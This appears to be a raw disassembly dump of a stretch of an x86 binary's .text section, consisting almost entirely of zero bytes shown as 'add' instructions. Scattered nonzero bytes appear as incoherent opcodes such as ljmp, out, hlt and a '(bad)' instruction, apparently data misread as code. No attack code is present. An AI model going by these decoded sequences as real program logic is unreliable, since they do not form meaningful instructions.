                           .text:00401e33 00 00                            add    %al,(%eax)
                           .text:00401e35 00 00                            add    %al,(%eax)
                           .text:00401e37 00 00                            add    %al,(%eax)
                           .text:00401e39 00 00                            add    %al,(%eax)
                           .text:00401e3b 00 00                            add    %al,(%eax)
                           .text:00401e3d 00 00                            add    %al,(%eax)
                           .text:00401e3f 00 00                            add    %al,(%eax)
                           .text:00401e41 00 00                            add    %al,(%eax)
                           .text:00401e43 00 00                            add    %al,(%eax)
                           .text:00401e45 00 00                            add    %al,(%eax)
                           .text:00401e47 00 00                            add    %al,(%eax)
                           .text:00401e49 00 00                            add    %al,(%eax)
                           .text:00401e4b 00 00                            add    %al,(%eax)
                           .text:00401e4d 00 00                            add    %al,(%eax)
                           .text:00401e4f 00 00                            add    %al,(%eax)
                           .text:00401e51 00 00                            add    %al,(%eax)
                           .text:00401e53 00 00                            add    %al,(%eax)
                           .text:00401e55 00 00                            add    %al,(%eax)
                           .text:00401e57 00 00                            add    %al,(%eax)
                           .text:00401e59 00 00                            add    %al,(%eax)
                           .text:00401e5b 00 00                            add    %al,(%eax)
                           .text:00401e5d 00 00                            add    %al,(%eax)
                           .text:00401e5f 00 00                            add    %al,(%eax)
                           .text:00401e61 00 00                            add    %al,(%eax)
                           .text:00401e63 00 00                            add    %al,(%eax)
                           .text:00401e65 00 00                            add    %al,(%eax)
                           .text:00401e67 00 5b 7f                         add    %bl,0x7f(%ebx)
                           .text:00401e6a ea 4c 6b 75 32 a2 20             ljmp   $0x20a2,$0x32756b4c
                           .text:00401e71 b4 51                            mov    $0x51,%ah
                           .text:00401e73 b7 bf                            mov    $0xbf,%bh
                           .text:00401e75 7f 00                            jg     0x00401e77
                           .text:00401e77 00 08                            add    %cl,(%eax)
                           .text:00401e79 55                               push   %ebp
                           .text:00401e7a 6d                               insl   (%dx),%es:(%edi)
                           .text:00401e7b c5 bf 7f 00 00 00                lds    0x7f(%edi),%edi
                           .text:00401e81 00 00                            add    %al,(%eax)
                           .text:00401e83 00 00                            add    %al,(%eax)
                           .text:00401e85 00 00                            add    %al,(%eax)
                           .text:00401e87 00 00                            add    %al,(%eax)
                           .text:00401e89 00 00                            add    %al,(%eax)
                           .text:00401e8b 00 00                            add    %al,(%eax)
                           .text:00401e8d 00 00                            add    %al,(%eax)
                           .text:00401e8f 00 00                            add    %al,(%eax)
                           .text:00401e91 00 00                            add    %al,(%eax)
                           .text:00401e93 00 00                            add    %al,(%eax)
                           .text:00401e95 00 00                            add    %al,(%eax)
                           .text:00401e97 00 dd                            add    %bl,%ch
                           .text:00401e99 14 de                            adc    $0xde,%al
                           .text:00401e9b 7f 8a                            jg     0x00401e27
                           .text:00401e9d b5 b0                            mov    $0xb0,%ch
                           .text:00401e9f 69 c0 93 98 b5 bf                imul   $0xbfb59893,%eax,%eax
                           .text:00401ea5 7f 00                            jg     0x00401ea7
                           .text:00401ea7 00 80 58 70 00 00                add    %al,0x7058(%eax)
                           .text:00401ead 00 00                            add    %al,(%eax)
                           .text:00401eaf 00 00                            add    %al,(%eax)
                           .text:00401eb1 00 00                            add    %al,(%eax)
                           .text:00401eb3 00 00                            add    %al,(%eax)
                           .text:00401eb5 00 00                            add    %al,(%eax)
                           .text:00401eb7 00 00                            add    %al,(%eax)
                           .text:00401eb9 00 00                            add    %al,(%eax)
                           .text:00401ebb 00 00                            add    %al,(%eax)
                           .text:00401ebd 00 00                            add    %al,(%eax)
                           .text:00401ebf 00 00                            add    %al,(%eax)
                           .text:00401ec1 00 00                            add    %al,(%eax)
                           .text:00401ec3 00 00                            add    %al,(%eax)
                           .text:00401ec5 00 00                            add    %al,(%eax)
                           .text:00401ec7 00 00                            add    %al,(%eax)
                           .text:00401ec9 00 00                            add    %al,(%eax)
                           .text:00401ecb 00 00                            add    %al,(%eax)
                           .text:00401ecd 00 00                            add    %al,(%eax)
                           .text:00401ecf 00 00                            add    %al,(%eax)
                           .text:00401ed1 00 00                            add    %al,(%eax)
                           .text:00401ed3 00 00                            add    %al,(%eax)
                           .text:00401ed5 00 00                            add    %al,(%eax)
                           .text:00401ed7 00 00                            add    %al,(%eax)
                           .text:00401ed9 00 00                            add    %al,(%eax)
                           .text:00401edb 00 00                            add    %al,(%eax)
                           .text:00401edd 00 00                            add    %al,(%eax)
                           .text:00401edf 00 00                            add    %al,(%eax)
                           .text:00401ee1 00 00                            add    %al,(%eax)
                           .text:00401ee3 00 00                            add    %al,(%eax)
                           .text:00401ee5 00 00                            add    %al,(%eax)
                           .text:00401ee7 00 00                            add    %al,(%eax)
                           .text:00401ee9 00 00                            add    %al,(%eax)
                           .text:00401eeb 00 00                            add    %al,(%eax)
                           .text:00401eed 00 00                            add    %al,(%eax)
                           .text:00401eef 00 00                            add    %al,(%eax)
                           .text:00401ef1 00 00                            add    %al,(%eax)
                           .text:00401ef3 00 00                            add    %al,(%eax)
                           .text:00401ef5 00 00                            add    %al,(%eax)
                           .text:00401ef7 00 00                            add    %al,(%eax)
                           .text:00401ef9 00 00                            add    %al,(%eax)
                           .text:00401efb 00 00                            add    %al,(%eax)
                           .text:00401efd 00 00                            add    %al,(%eax)
                           .text:00401eff 00 00                            add    %al,(%eax)
                           .text:00401f01 00 00                            add    %al,(%eax)
                           .text:00401f03 00 00                            add    %al,(%eax)
                           .text:00401f05 00 00                            add    %al,(%eax)
                           .text:00401f07 00 00                            add    %al,(%eax)
                           .text:00401f09 00 00                            add    %al,(%eax)
                           .text:00401f0b 00 00                            add    %al,(%eax)
                           .text:00401f0d 00 00                            add    %al,(%eax)
                           .text:00401f0f 00 00                            add    %al,(%eax)
                           .text:00401f11 00 00                            add    %al,(%eax)
                           .text:00401f13 00 00                            add    %al,(%eax)
                           .text:00401f15 00 00                            add    %al,(%eax)
                           .text:00401f17 00 00                            add    %al,(%eax)
                           .text:00401f19 00 00                            add    %al,(%eax)
                           .text:00401f1b 00 00                            add    %al,(%eax)
                           .text:00401f1d 00 00                            add    %al,(%eax)
                           .text:00401f1f 00 00                            add    %al,(%eax)
                           .text:00401f21 00 00                            add    %al,(%eax)
                           .text:00401f23 00 00                            add    %al,(%eax)
                           .text:00401f25 00 00                            add    %al,(%eax)
                           .text:00401f27 00 00                            add    %al,(%eax)
                           .text:00401f29 00 00                            add    %al,(%eax)
                           .text:00401f2b 00 00                            add    %al,(%eax)
                           .text:00401f2d 00 00                            add    %al,(%eax)
                           .text:00401f2f 00 00                            add    %al,(%eax)
                           .text:00401f31 00 00                            add    %al,(%eax)
                           .text:00401f33 00 00                            add    %al,(%eax)
                           .text:00401f35 00 00                            add    %al,(%eax)
                           .text:00401f37 00 00                            add    %al,(%eax)
                           .text:00401f39 00 00                            add    %al,(%eax)
                           .text:00401f3b 00 00                            add    %al,(%eax)
                           .text:00401f3d 00 00                            add    %al,(%eax)
                           .text:00401f3f 00 00                            add    %al,(%eax)
                           .text:00401f41 00 00                            add    %al,(%eax)
                           .text:00401f43 00 00                            add    %al,(%eax)
                           .text:00401f45 00 00                            add    %al,(%eax)
                           .text:00401f47 00 00                            add    %al,(%eax)
                           .text:00401f49 00 00                            add    %al,(%eax)
                           .text:00401f4b 00 00                            add    %al,(%eax)
                           .text:00401f4d 00 00                            add    %al,(%eax)
                           .text:00401f4f 00 00                            add    %al,(%eax)
                           .text:00401f51 00 00                            add    %al,(%eax)
                           .text:00401f53 00 00                            add    %al,(%eax)
                           .text:00401f55 00 00                            add    %al,(%eax)
                           .text:00401f57 00 00                            add    %al,(%eax)
                           .text:00401f59 00 00                            add    %al,(%eax)
                           .text:00401f5b 00 00                            add    %al,(%eax)
                           .text:00401f5d 00 00                            add    %al,(%eax)
                           .text:00401f5f 00 00                            add    %al,(%eax)
                           .text:00401f61 00 00                            add    %al,(%eax)
                           .text:00401f63 00 00                            add    %al,(%eax)
                           .text:00401f65 00 00                            add    %al,(%eax)
                           .text:00401f67 00 00                            add    %al,(%eax)
                           .text:00401f69 00 00                            add    %al,(%eax)
                           .text:00401f6b 00 00                            add    %al,(%eax)
                           .text:00401f6d 00 00                            add    %al,(%eax)
                           .text:00401f6f 00 e6                            add    %ah,%dh
                           .text:00401f71 a5                               movsl  %ds:(%esi),%es:(%edi)
                           .text:00401f72 dd 69 d2                         (bad)  -0x2e(%ecx)
                           .text:00401f75 a3 8a 8a 90 93                   mov    %eax,0x93908a8a
                           .text:00401f7a 98                               cwtl   
                           .text:00401f7b b5 bf                            mov    $0xbf,%ch
                           .text:00401f7d 7f 00                            jg     0x00401f7f
                           .text:00401f7f 00 50 97                         add    %dl,-0x69(%eax)
                           .text:00401f82 8e ba bf 7f 00 00                mov    0x7fbf(%edx),%?
                           .text:00401f88 e7 32                            out    %eax,$0x32
                           .text:00401f8a 3a 79 02                         cmp    0x2(%ecx),%bh
                           .text:00401f8d 5c                               pop    %esp
                           .text:00401f8e 9f                               lahf   
                           .text:00401f8f 8a f0                            mov    %al,%dh
                           .text:00401f91 93                               xchg   %eax,%ebx
                           .text:00401f92 98                               cwtl   
                           .text:00401f93 b5 bf                            mov    $0xbf,%ch
                           .text:00401f95 7f 00                            jg     0x00401f97
                           .text:00401f97 00 08                            add    %cl,(%eax)
                           .text:00401f99 55                               push   %ebp
                           .text:00401f9a 6d                               insl   (%dx),%es:(%edi)
                           .text:00401f9b c5 bf 7f 00 00 68                lds    0x6800007f(%edi),%edi
                           .text:00401fa1 19 74 74 a6                      sbb    %esi,-0x5a(%esp,%esi,2)
                           .text:00401fa5 1b 75 71                         sbb    0x71(%ebp),%esi
                           .text:00401fa8 b0 94                            mov    $0x94,%al
                           .text:00401faa 98                               cwtl   
                           .text:00401fab b5 bf                            mov    $0xbf,%ch
                           .text:00401fad 7f 00                            jg     0x00401faf
                           .text:00401faf 00 00                            add    %al,(%eax)
                           .text:00401fb1 f4                               hlt    
                           .text:00401fb2 be 05 00 00 00                   mov    $0x5,%esi
                           .text:00401fb7 00 00                            add    %al,(%eax)
                           .text:00401fb9 00 00                            add    %al,(%eax)
                           .text:00401fbb 00 00                            add    %al,(%eax)
                           .text:00401fbd 00 00                            add    %al,(%eax)
                           .text:00401fbf 00 00                            add    %al,(%eax)
                           .text:00401fc1 00 00                            add    %al,(%eax)
                           .text:00401fc3 00 00                            add    %al,(%eax)
                           .text:00401fc5 00 00                            add    %al,(%eax)
                           .text:00401fc7 00 00                            add    %al,(%eax)
                           .text:00401fc9 00 00                            add    %al,(%eax)
                           .text:00401fcb 00 00                            add    %al,(%eax)
                           .text:00401fcd 00 00                            add    %al,(%eax)
                           .text:00401fcf 00 00                            add    %al,(%eax)
                           .text:00401fd1 00 00                            add    %al,(%eax)
                           .text:00401fd3 00 00                            add    %al,(%eax)
                           .text:00401fd5 00 00                            add    %al,(%eax)
                           .text:00401fd7 00 00                            add    %al,(%eax)
                           .text:00401fd9 00 00                            add    %al,(%eax)
                           .text:00401fdb 00 00                            add    %al,(%eax)
                           .text:00401fdd 00 00                            add    %al,(%eax)
                           .text:00401fdf 00 00                            add    %al,(%eax)
                           .text:00401fe1 00 00                            add    %al,(%eax)
                           .text:00401fe3 00 00                            add    %al,(%eax)
                           .text:00401fe5 00 00                            add    %al,(%eax)
                           .text:00401fe7 00 00                            add    %al,(%eax)
                           .text:00401fe9 00 00                            add    %al,(%eax)
                           .text:00401feb 00 00                            add    %al,(%eax)
                           .text:00401fed 00 00                            add    %al,(%eax)
                           .text:00401fef 00 00                            add    %al,(%eax)
                           .text:00401ff1 00 00                            add    %al,(%eax)
                           .text:00401ff3 00 00                            add    %al,(%eax)
                           .text:00401ff5 00 00                            add    %al,(%eax)
                           .text:00401ff7 00 00                            add    %al,(%eax)
                           .text:00401ff9 00 00                            add    %al,(%eax)
                           .text:00401ffb 00 00                            add    %al,(%eax)
                           .text:00401ffd 00 00                            add    %al,(%eax)
                           .text:00401fff 00                               .byte 0x0
